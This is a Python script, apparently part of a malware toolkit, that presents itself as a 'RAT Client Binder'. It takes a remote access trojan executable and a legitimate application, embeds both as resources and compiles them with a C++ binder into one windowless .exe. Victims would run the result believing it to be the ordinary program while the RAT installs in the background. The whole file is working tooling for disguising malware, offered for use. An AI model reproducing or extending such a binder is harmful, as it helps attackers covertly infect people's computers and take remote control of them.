#!/usr/bin/env python3
import os
import sys
import shutil
import subprocess
from colorama import Fore, Style, init # type: ignore

# Initialize colorama
init()

def print_banner():
    print(f"""{Fore.GREEN}
██████╗  █████╗ ████████╗    ██████╗ ██╗███╗   ██╗██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║   ██║       ██████╔╝██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
██╔══██╗██╔══██║   ██║       ██╔══██╗██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
██║  ██║██║  ██║   ██║       ██████╔╝██║██║ ╚████║██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}""")
    print(f"{Fore.CYAN}RAT Client Binder{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Bind RAT client with legitimate applications{Style.RESET_ALL}\n")

def validate_file_exists(filepath):
    if not os.path.isfile(filepath):
        print(f"{Fore.RED}Error: File {filepath} does not exist!{Style.RESET_ALL}")
        return False
    return True

def bind_files(rat_client, legitimate_app, output_file):
    print(f"{Fore.CYAN}Binding files...{Style.RESET_ALL}")
    
    # Compile the binder if needed
    if not os.path.exists("rat_client_binder.exe"):
        print(f"{Fore.YELLOW}Compiling binder...{Style.RESET_ALL}")
        compile_cmd = "g++ -o rat_client_binder.exe rat_client_binder.cpp -lws2_32"
        result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{Fore.RED}Compilation failed:{Style.RESET_ALL}")
            print(result.stderr)
            return False
    
    # Create a temporary directory
    temp_dir = "temp_binding"
    os.makedirs(temp_dir, exist_ok=True)
    
    # Copy files to temp directory
    shutil.copy(rat_client, os.path.join(temp_dir, "rat_client.exe"))
    shutil.copy(legitimate_app, os.path.join(temp_dir, "legit_app.exe"))
    
    # Create the resource script
    rc_file = os.path.join(temp_dir, "resources.rc")
    with open(rc_file, 'w') as f:
        f.write('101 RCDATA "rat_client.exe"\n')
        f.write('102 RCDATA "legit_app.exe"\n')
    
    # Compile the resource script
    windres_cmd = f'windres -i {rc_file} -o {os.path.join(temp_dir, "resources.o")}'
    subprocess.run(windres_cmd, shell=True)
    
    # Compile the final executable
    compile_cmd = f'g++ -o "{output_file}" rat_client_binder.cpp {os.path.join(temp_dir, "resources.o")} -lws2_32 -mwindows'
    result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
    
    # Clean up
    shutil.rmtree(temp_dir)
    
    if result.returncode != 0:
        print(f"{Fore.RED}Binding failed:{Style.RESET_ALL}")
        print(result.stderr)
        return False
    
    print(f"{Fore.GREEN}Successfully bound files to {output_file}{Style.RESET_ALL}")
    return True

def main():
    print_banner()
    
    # Get user input
    print(f"{Fore.YELLOW}Enter the file paths:{Style.RESET_ALL}")
    
    rat_client = input(f"{Fore.CYAN}RAT client executable: {Style.RESET_ALL}")
    if not validate_file_exists(rat_client):
        return
    
    legitimate_app = input(f"{Fore.CYAN}Legitimate application: {Style.RESET_ALL}")
    if not validate_file_exists(legitimate_app):
        return
    
    output_file = input(f"{Fore.CYAN}Output filename: {Style.RESET_ALL}")
    if not output_file:
        output_file = "bound_application.exe"
    
    # Add .exe extension if not present
    if not output_file.lower().endswith('.exe'):
        output_file += '.exe'
    
    # Bind the files
    print(f"\n{Fore.YELLOW}Binding files with the following settings:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}RAT client: {rat_client}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Legitimate application: {legitimate_app}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Output filename: {output_file}{Style.RESET_ALL}")
    
    bind_files(rat_client, legitimate_app, output_file)

if __name__ == "__main__":
    main()